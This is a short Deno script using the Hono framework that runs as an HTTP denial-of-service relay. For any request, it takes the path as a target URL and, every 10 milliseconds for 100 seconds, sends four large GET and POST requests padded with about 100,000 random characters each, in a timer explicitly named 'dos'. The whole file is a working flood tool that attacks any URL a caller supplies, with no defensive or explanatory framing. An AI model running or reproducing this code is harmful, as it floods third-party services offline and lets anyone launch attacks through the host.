import { Hono } from "https://deno.land/x/hono@v3.4.1/mod.ts";
import data from "./data.json" assert { type: "json" };

const app = new Hono();

app.all("/*", async (c) => {
  const url = new URL(c.req.url).pathname.slice(1)
  const dos = setInterval(async () => {
    fetch(url, {
      method: "GET",
      body: "a=" + Math.random().toString(36).repeat(10000)
    })
    fetch(url, {
      method: "POST",
      body: "a=" + Math.random().toString(36).repeat(10000)
    })
    fetch(url, {
      method: "GET",
      body: "a=" + Math.random().toString(36).repeat(10000)
    })
    fetch(url, {
      method: "POST",
      body: "a=" + Math.random().toString(36).repeat(10000)
    })
  }, 10)

  setTimeout(() => clearInterval(dos), 100000)
  
  return c.text("01010101010")
});

Deno.serve(app.fetch);
